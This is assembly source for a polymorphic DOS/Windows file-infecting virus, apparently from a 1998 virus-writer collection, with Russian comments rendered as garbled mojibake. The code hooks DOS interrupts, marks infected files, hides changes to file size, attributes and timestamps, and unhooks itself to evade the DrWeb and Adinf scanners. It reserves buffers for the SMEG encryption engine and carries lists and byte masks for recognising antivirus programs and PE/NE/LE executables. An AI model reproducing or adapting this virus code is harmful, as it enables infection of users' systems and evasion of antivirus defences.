;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
begin_win_virus:
include wv32\wv32.dat
        db       68h     ;„«¨­­  6h
RVA_sub dd       0
        retn
end_win_virus:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¤¯p®£p ¬¬  ®¡p ¡®âª¨ 21-£® ¯p¥pë¢ ­¨ï á ®¯¨á â¥«¥¬ ä ©« 
call_int_21_with_use_handle:
        push     bx
place_of_handle:
        mov      bx,0100h
        call     call_int_21
        pop      bx
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¤¯p®£p ¬¬  ®¡p ¡®âª¨ 21-£® ¯p¥pë¢ ­¨ï.
call_int_21:
        pushf
        cli
place_of_int21:
        db       09ah,00,00,00,00 ;Call 0000:0000
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;è¨¡®ç­ ï ¤®á äã­ªæ¨ï
wrong_dos_function:
        mov      al,03h
        iret
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ®¤¯p®£p ¬¬  áª ­¨p®¢ ­¨ï ¯ ¬ïâ¨.
; ‚å®¤:  ES:DI ®âªã¤  áª ­¨p®¢ âì H ¯p¨¬¥p: B800:0001
;        CX áª®«ìª® ¬­®£® áª ­¨p®¢ âì (¡ ©âë)
;        BX è £ áª ­¨p®¢ ­¨ï (BX=1 - ¯® ¡ ©â­®
;                             BX=2 - ç¥p¥§ ¤¢ )
;        DS:[SI] - ‘âp®ª  ¢ ä®p¬ â¥ 5,'áâ¥«á' - —â® ¨áª âì
;        ‚ áâp®ª¥ ¬®¦­® ã¯®âp¥¡«ïâì á¨¬¢®« "*", ª®â®pë©
;        ®¡®§­ ç¥¥â çâ® ¢ íâ®¬ ¬¥áâ¥ ¬®¦¥â áâ®ïâì «î¡®©
;        á¨¬¢®«.
; ‚ëå®¤: CF=0 ¥á«¨ ­¥ ­ è«¨
;        ES:DI - £¤¥ § á¥ª«¨ ¯¥p¢ãî ¡ãª¢ã ¥á«¨ CF=1
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
scan_mem_call:
        push_all_register
        xor      cx,cx
        mov      cl,[si]
        xor      ax,ax
Gtmp2:  mov      al,[si+1]
        cmp      al,'*'
        jz       Gtmp30
        cmp      es:[di],al
        jnz      Gtmp1
Gtmp30: add      di,bx
        inc      si
        loop     Gtmp2
        pop_all_register
        stc
        retn
Gtmp1:  pop_all_register
        add      di,bx
        loop     scan_mem_call
        clc
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
set_dses_cs:
        push     cs cs
        pop      es ds
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ®áâ ¢¨âì ­ è¥ 24-®¥ ¯p¥pë¢ ­¨¥ ;±
set_our_int_24:
        push_all_register
        push     cs
        pop      ds   ;DS=CS
        mov      ax,3524h
        call     call_int_21
        mov      word ptr ds:[old_int_24_low-virus+1],bx
        mov      word ptr ds:[old_int_24_high-virus+1],es
        mov      ax,2524h
        mov      dx,offset(wrong_dos_function-virus)
        call     call_int_21
        jmp      pop_all_reg_and_retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ®áâ ¢¨âì áâ p®¥ 24-®¥ ¯p¥pë¢ ­¨¥ ­  ¬¥áâ® ;±
set_old_int_24:
        push_all_register
        mov      ax,2524h
old_int_24_low:
        mov      dx,0000h
old_int_24_high:
        mov      bx,0000h
        mov      ds,bx
        call     call_int_21
        jmp      pop_all_reg_and_retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
check_on_allredy_virused_with_take_time:
        mov      ax,5700h
        call     call_int_21_with_use_handle
        mov      bx,offset(time_date_of_file-virus)
        mov      word ptr cs:[bx],cx
        mov      word ptr cs:[bx+2],dx
check_on_allredy_virused:
        push     dx cx
        mov      ax,es:[bx+02]
        mov      dx,es:[bx]         ; ‚¥p®ïâ­®áâì á«ãç ©­®£® á®¢¯ ¤¥­¨ï
                                    ; p ¢­  0.005.  áç¨â ­® ¯p®£p ¬®© Adinf
                                    ; ¢ p¥¦¨¬¥ ¯®¨áª  ‘âí«á ¢¨pãá®¢.
                                    ; ˆ§ 1678 ä ©«®¢ ®­ § ¡p ª®¢ « ­¥ ¢ ç¥¬
                                    ; ­¥ ¯®¢¨­­ëå 8 ä ©«®¢.
        and      dl,0e0h
        add      ax,dx
        add      ax,03
        xor      dx,dx
        mov      cx,1dh
        div      cx
        mov      ax,es:[bx]
        and      al,1fh
        cmp      al,dl
        stc
        jz       Ltmp40
        mov      ax,es:[bx]
        and      ax,0ffe0h
        or       al,dl
        clc
Ltmp40:
        pop      cx dx
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‘­ïâì  âp¨p¨¡ãâë ã ä ©«  ¨ § ¯®¬­¨âì áâ pë© ¢ ïç¥©ª¥ ¯ ¬ïâ¨
;‚å®¤: DS:DX - ˆ¬ï ä ©«  Asciiz
;‚ëå®¤: ‘­ïâ  âp¨¡ãâ ã íâ®£® ä ©« ,   áâ pë© § ¯®¬­¥­ ¢ á®®â¢¥âáâ¢ãîé¥¬ ¬¥áâ¥
void_atr:
        mov      ax,4300h       ; ˆ§¢«¥ç â¥ªãé¨©  âp¨¡ãâ ä ©« 
        call     call_int_21
        jc       void_atr_failed
        mov      word ptr cs:[cell_of_atr-virus+1],cx
        mov      ax,4301h       ; ®áâ ¢¨âì  âp¨¡ãâ 0
        xor      cx,cx
        call     call_int_21
void_atr_failed:
        retn
set_old_atr:
        mov      ax,4301h       ; “áâ ­®¢¨âì áâ pë©  âp¨¡ãâ ä ©« 
cell_of_atr:
        mov      cx,0100h
        jmp      call_int_21_with_use_handle
write_to_file_through_handle:
        mov      ah,40h
        jmp      call_int_21_with_use_handle
read_file_through_handle:
        mov      ah,3fh
        jmp      call_int_21_with_use_handle
set_lseek_begin:
        xor      cx,cx
        xor      dx,dx
set_lseek_begin_pluscxdx:
        mov      ax,4200h
        jmp      call_int_21_with_use_handle
set_lseek_curent_pluscxdx:
        mov      ax,4201h
        jmp      call_int_21_with_use_handle
set_lseek_end:
        xor      cx,cx
        xor      dx,dx
set_lseek_end_pluscxdx:
        mov      ax,4202h
        jmp      call_int_21_with_use_handle
set_time_of_file:
        mov      ax,5701h
        mov      cx,word ptr cs:[time_date_of_file-virus]
        mov      dx,word ptr cs:[time_date_of_file-virus+2]
        jmp      call_int_21_with_use_handle
close_file_handle:
        mov      ah,3eh
        jmp      call_int_21_with_use_handle
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‚å®¤­ë¥ ¤ ­­ë¥: ES:BX
length_virus_on_file=(endvirus-virus+antivirus_break_block_end-antivirus_break_block+size buffer_for_SMEG_decryptor) ;
give_length_without_virus:
        sub      word ptr es:[bx],length_virus_on_file
        sbb      word ptr es:[bx+2],0
        jnc      give_length_without_virus_work_successfuly
        add      word ptr es:[bx],length_virus_on_file
        adc      word ptr es:[bx+2],0
give_length_without_virus_work_successfuly:
        retn
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
; ã¤¥¬ ¡®p®âìáï á ­ ¤¯¨áìî "‚®§¬®¦­® ¢ ¯ ¬ïâ¨ ­ å®¤¨âáï  ªâ¨¢­ë© ¢¨pãá"
; p®â¨¢ Adinf ¢ p¥¦¨¬¥ ®¨áª  ‘â¥«á ¢¨pãá®¢
;‡ ¤ ç  ã¡p âì INT 21 á manager' 
anti_mem:
; H  ¢å®¤¥ ­ã¦­® ­ ¬ DS:DX -  ¤p¥áá áâp®ª¨ ASCIIZ á ¨¬¥­¥¬ ä ©« 
;                    ES:BX -  ¤p¥áá EPB («®ª ¯ p ¬¥âp®¢ EXEC)
        call     set_old_int_24     ; ‘â ¢¨¬ áâ p®¥ 24 ¯à¥àë¢ ­¨¥
        ;“¡¥p¥¬ INT21 á ­ á (â®£¤  DrWeb ¯p®áâ® ®¡«®¬¨âáï) å „ ­¨«®¢ ­¥
        ;¯p¥¤ãá¬®âp¥« âë â ª®© ¯®¢®p®â á®¡ëâ¨© ;)
        push_all_register
        zero_ds
        les      ax,dword ptr cs:[place_of_int21-virus+1]
        mov      ds:[21h*4],ax
        mov      ds:[21h*4+2],es
        mov      byte ptr ds:[manager_idle_flag-begin_manager+address_of_manager_in_memory],1
        pop_all_register
        popf
        jmp      dword ptr cs:[place_of_int21-virus+1]
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ END ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
endvirus:
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
dataarea_for_SMEG:
datasize                  dw ?       ; 00h length of data to crypt
sourceptr                 dw ?       ; 02h pointer to data to crypt
targetptr                 dw ?       ; 04h pointer of where to put crypted data
                          db ?       ; 06h reg0 encryption value
                          db ?       ; 07h reg1 counter register
                          db ?       ; 08h reg2 temporary storage for data to be decrypted
                          db ?       ; 09h reg3
                          db ?       ; 0Ah reg4 (always BP)
                          db ?       ; 0Bh reg5
                          db ?       ; 0Ch reg6
                          db ?       ; 0Dh reg7 pointer register
cryptval                  db ?       ; 0Eh encryption value
ptr_offsets               dw ?       ; 0Fh XXXX in [bx+XXXX] memory references
loop_top                  dw ?       ; 11h points to top of decryption loop
pointer_patch             dw ?       ; 13h points to initialisation of pointer
counter_patch             dw ?       ; 15h points to initialisation of counter
pointer_fixup             dw ?       ; 17h needed for pointer calculation
crypt_type                db ?       ; 19h how is it encrypted?
initialIP                 dw ?       ; 1Ah IP at start of decryptor
cJMP_patch                dw ?       ; 1Ch conditional jmp patch
CALL_patch                dw ?       ; 1Eh CALL patch
nJMP_patch                dw ?       ; 20h near JMP patch
decryptor_size            dw ?       ; 22h size of decryptor
last_CALL                 dw ?       ; 24h location of an old CALL patch location
which_tbl                 dw ?       ; 26h which table to use
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;‡ £®«®¢®ª Win ®¡ì¥ªâ 
WIN_object                db 40d  dup (?)
;H®¢ë© § £®«®¢®ª
new_first_1c_byte         db 1ch  dup (?)
;PE § £®«®¢®ª
PE_EXE_header             db 60h  dup (?)
;¡é¨© ¡ãää¥à
common_buffer             db 100h dup (?)
;áâ «ì­ë¥ ¤ ­­ë¥
obj_point                 dw ?
PE_EXE_header_point       dw ?
;¥p¢®¥ íâ® TIME(DW), ¯®â®¬ DATE(DW)
time_date_of_file         dd ?
;ãää¥à ¤«ï á®§¤ ­¨ï SMEG_Decryptor' 
buffer_for_SMEG_decryptor db 600h dup (?)
;ãää¥p ¤«ï § è¨äà®¢ ­­®£® ¢¨àãá 
buffer_for_crypted_virus  db offset(endvirus-virus) dup (?)
.errnz ($-virus) GT 4000H ;…á«¨ ­ è ¢¨àãá à §¤ã«áï ¢ à §¬¥à å ¡®«¥¥ ç¥¬ 16K
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
endvirus_in_memory:
end start
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[POWERFUL.ASM]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MACRO.INC]ÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ Macro ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ¿
push_all_register MACRO                                       ;³
        pusha                                                 ;³
        push      es ds                                       ;³
        endm                                                  ;³
pop_all_register  MACRO                                       ;³
        pop       ds es                                       ;³
        popa                                                  ;³
        endm                                                  ;³
push_all_register_withf MACRO                                 ;³
        pusha                                                 ;³
        pushf                                                 ;³
        push      es ds                                       ;³
        endm                                                  ;³
pop_all_register_withf  MACRO                                 ;³
        pop       ds es                                       ;³
        popf                                                  ;³
        popa                                                  ;³
        endm                                                  ;³
zero_ds MACRO                                                 ;³
        push     0000h                                        ;³
        pop      ds                                           ;³
        endm                                                  ;³
zero_es MACRO                                                 ;³
        push     0000h                                        ;³
        pop      es                                           ;³
        endm                                                  ;³
set_ds_BC00 MACRO                                             ;³
        push     0bc00h                                       ;³
        pop      ds                                           ;³
        endm                                                  ;³
set_es_BC00 MACRO                                             ;³
        push     0bc00h                                       ;³
        pop      es                                           ;³
        endm                                                  ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[MACRO.INC]ÄÄÄ
ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ[ASCIIZ.ASM]ÄÄÄ
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;®¤¯p®£p ¬¬  ¤¥â¥ªâ¨p®¢ ­¨ï ä ©«  (c)'98 Black Harmer
;ˆá¯®«ì§ã¥âáï ¢¨pãá ¬¨ ¤«ï ®¯p¥¤¥«¥­¨ï ª ª®© ä ©« ¬®¦­® § p ¦ âì,  
;ª ª®© ­¥«ì§ï.
;‚å®¤:  DS:DX - ãª §ë¢ ¥â ­  áâp®ªã ¢ ä®p¬¥: "¤¨áª:\¯ãâì\¨¬ï ä ©« ",0
;       „®«¦­  ¡ëâì ®¯p¥¤¥«¥­  ¯®¤¯p®£p ¬¬  call_int_21, å®âï ¡ë ¢®â â ª®£®
;       á®¤¥p¦ ­¨ï:
;       call_int_21 proc near
;       int   21h
;       retn
;       call_int_21 endp
;‚ëå®¤: ‘¬®âp¨â¥ ®¯¨á ­¨¥ ª ¯¥p¥¬¥­­ë¬:
;       1) filename
;       2) extention
;       3) filemask
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¸
filename db 0                                                  ;³
;0, ¥á«¨ ­¥ ®¤­® ¨¬ï ¨§ ¯¥p¥ç­ï FILENAMES ­¥ á®¢¯ «®.          ;³
;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® ¨¬¥­¨.                          ;³
;H ¯p¨¬¥p ¥á«¨ ¢å®¤­®¥ DS:DX ãª §ë¢ ¥â ­  'D:\AVP.EXE', â®     ;³
;­  ¢ëå®¤¥ ¨§ ¯®¤¯p®£p ¬¬ë filename ¡ã¤¥â p ¢­  1.             ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;”®p¬ â ¯¥p¥ç­ï ¨¬¥­ ä ©«®¢:                                   ;³
;1) ¯¥p¢ë¬ ¡ ©â®¬ ¨¤¥â ¤«¨­­  ¨¬¥­¨. p¨¬¥p 4,'ABCD'           ;³
;2) ¯®â®¬ á ¬® ¨¬ï (¡®«ìè¨¬¨ ¡ãª¢ ¬¨)                          ;³
;3) ¨ â.¤ ¤pã£¨¥ ¨¬¥­                                          ;³
;4) ¯¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï ¡ ©â®¬ 0ffh                  ;³
filenames:                                                     ;³
        ;€­â¨¢¨pãáë                                            ;³
        db       07,'AVP.EXE'                                  ;³
        db       09,'DRWEB.EXE'                                ;³
        db       09,'ADINF.EXE'                                ;³
        db       11,'NAVBOOT.EXE'                              ;³
        db       12,'AIDSTEST.EXE'                             ;³
        ;‘¨áâ¥¬­ë¥ ä ©«ë                                       ;³
        db       11,'COMMAND.COM'                              ;³
        db       07,'WIN.COM'                                  ;³
        db       12,'CONAGENT.EXE'                             ;³
        db       11,'WININIT.EXE'                              ;³
        db       09,'START.EXE'                                ;³
        db       0ffh ; - p¨§­ ª ª®­æ                         ;³
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
extention db 4                                                 ;³
;0, ¥á«¨ ­¥ ®¤­® p áè¨p¥­¨¥ ¨§ ¯¥p¥ç­ï extentions ­¥ á®¢¯ «®.  ;³
;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥£® p áè¨p¥­¨ï.                     ;³
;H ¯p¨¬¥p, ¥á«¨ ¢å®¤­®¥ DS:DX ãª §ë¢ ¥â ­  'D:\AVP.EXE', â®    ;³
;­  ¢ëå®¤¥ ¨§ ¯®¤¯p®£p ¬¬ë extention ¡ã¤¥â p ¢­® 3.            ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;‘¬. ä®p¬ â ¯¥p¥ç­ï ¨¬¥­ ä ©«®¢                                ;³
extentions:                                                    ;³
        db       04,'COM',0                                    ;³
        db       04,'SYS',0                                    ;³
        db       04,'EXE',0                                    ;³
        db       0ffh  ; - p¨§­ ª ª®­æ                        ;³
;ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍµ
;‚­¨¬ ­¨¥ ¢ á«ãç ¥, ¥á«¨ extention=0, ¬ áª¨ ­¥ ¯p®¢¥pïîâáï     ;³
filemask         db 0                                          ;³
;0, ¥á«¨ ­¥ ®¤­  ¬ áª  ¨§ ¯¥p¥ç­ï filemasks ­¥ á®¢¯ « .        ;³
;ˆ­ ç¥ ­®¬¥p áâp®ª¨ á®¢¯ ¢è¥© ¬ áª¨.                           ;³
mask_buffer      db 07h dup (0)                                ;³
;„«¨­­  ¡ãä¥p  ®¯p¥¤¥«ï¥âáï ¤«¨­­®© ¬ ªá¨¬ «ì­®© ¬ áª¨         ;³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
;”®à¬ â:                                                        ³
;1) ‘«®¢® á¬¥é¥­¨ï ¬ áª¨ (­¥ ¬®¦¥â ¨¬¥âì §­ ç¥­¨¥ 0XXFFh)       ³
;2) „«¨­­  ¬ áª¨ 0-0EFh ¨«¨ ª«îç¥¢®© á¨¬¢®« ¥á«¨ 0F0h-0FFh      ³
;   0F0h - ‘¬¥é¥­¨¥ ¡¥à¥âáï ®â ª®­æ  ä ©«                       ³
;   0F1h - ‘¬¥é¥­¨¥ ¡¥à¥âáï ¨§ ä ©«  ¯® 1)                      ³
;3) Œ áª :                                                      ³
;   a)  ‘¨¬¢®« '?' - «î¡®¥ ç¨á«®                                ³
;   b)  ‘¨¬¢®« '*' - «î¡®© §­ ª                                 ³
;4) ¥p¥ç¥­ì ¤®«¦¥­ § ª ­ç¨¢ âìáï á¨¬¢®«®¬ 0ffh                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÂÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
filemasks:                                   ;³                 ³
        dw       07h                         ;³ DrWeb           ³
        db       0f0h,7                      ;³ AllVersion      ³
        db       'DrW?.??'                   ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        dw       040h                        ;³ DrWeb           ³
        db       05h                         ;³ v3.24-v3.27     ³
        db       08h,0,0f3h,0a5h,4bh         ;³ v4.0            ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        dw       027                         ;³ Adinf           ³
        db       6                           ;³ AllVersion      ³
        db       00,'????',0ffh              ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        dw       3ch                         ;³ Windows 95-98   ³
        db       0f1h,2                      ;³ 32'bit prot     ³
        db       'PE'                        ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        dw       3ch                         ;³ Windows 3.x     ³
        db       0f1h,2                      ;³ 16'bit prot     ³
        db       'NE'                        ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        dw       3ch                         ;³ Windows 95-98   ³
        db       0f1h,2                      ;³ LE files        ³
        db       'LE'                        ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÅÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ´
        db       0ffh ; - p¨§­ ª ª®­æ       ;³                 ³
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÁÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÙ
Asciiz proc near
        pusha
        push     es ds dx
        call     initial_offset_Asciiz
initial_offset_Asciiz:
        pop      bp
        sub      bp,offset(initial_offset_Asciiz-Asciiz)
        ;„«ï ­ ç «  ®â¤¥«¨¬ ¨¬ï ä ©«  ®â ¯ãâ¨
        mov      si,dx
        push     ds
        pop      es
        mov      di,dx
        mov      cx,80h
set_bx_to_name:
        mov      bx,si
scan_name:
        lodsb    ;DS:[SI] ("¤¨áª:\¯ãâì\¨¬ï ä ©« ",0)-> AL
        call     al_to_big_letter
        stosb    ;AL -> ES:[DI]
        cmp      al,'\'
        jz       set_bx_to_name
        cmp      al,'/'
        jz       set_bx_to_name
        cmp      al,':'
        jz       set_bx_to_name
        or       al,al
        jz       filenames_check
        loop     scan_name
;ÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄÄ
;p®¢¥pª  ¯® ¯¥p¥ç­î ¨¬¥­
filenames_check:
        mov      si,bx
        push     cs
        pop      es
        lea      di,[bp+filenames-Asciiz]
       ;®¯p®£p ¬¬  áp ¢­¥­¨ï ®¤­®© áâp®ª¨ á ­¥áª®«ìª¨¬¨ ¤pã£¨¬¨ ¨§ ¡ §ë
       ;‚å®¤: DS:[SI] áâp®ª  á ª®â®p®© ¡ã¤¥â áp ¢­¨¢ âìáï ­ ¡®p áâp®ª
       ;      ES:[DI] ¡ §  áâp®ª ¢ ä®p¬ â¥:
       ;      db  6,'sergey'
       ;      db  5,'misha'
       ;      db  0ffh  - p¨§­ ª ª®­æ 
       ;‚ëå®¤: AX==0  - ­¥â á®¢¯ ¤¥­¨©
       ;       AX!=0 - ­®¬¥p á®¢¯ ¢è¥© áâp®ª¨ ­ ç¨­ ï á 1'æë
        call     cmps_string_with_databasestring
        mov      byte ptr cs:[bp+filename-Asciiz],al
